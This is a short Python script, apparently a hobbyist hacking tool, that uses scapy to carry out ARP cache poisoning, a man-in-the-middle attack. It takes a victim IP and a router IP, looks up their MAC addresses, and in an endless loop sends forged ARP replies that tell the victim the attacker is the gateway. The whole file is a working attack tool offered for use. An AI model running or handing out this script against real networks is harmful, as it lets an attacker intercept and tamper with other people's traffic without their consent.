
#? Exploiting APR Vulneribility By Manipulates ARB Cach
#! MITM Attack

#+ Requirements
"""
IP For Both The Router And The Victim
Mac-Address For Both The Router And The Victim
"""

import optparse
import time
import scapy.all as scapy


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target",dest="target_ip", help="Specify Victim IP Address")
    parser.add_option("-r", "--router",dest="router_ip", help="Specify Getway IP Address")
    options, _ = parser.parse_args()
    
    
    if not options.target_ip:
        parser.error("[-] Please Enter Target IP -t <IP>")
        parser.error("[-] -h --help For More Help")
    if not options.router_ip:
        parser.error("[-] Please Enter Router IP -r <IP>")
        parser.error("[-] -h --help For More Help")
    return options


options = get_args()
spoof_ip = options.router_ip
target_ip = options.target_ip

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = arp_broadcast/arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=2,verbose=False,iface="eth0")[0]
    return answer[0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,)
    scapy.send(arp_response, verbose=False)
    
    
while True:
    time.sleep(2)
    spoof(target_ip,spoof_ip)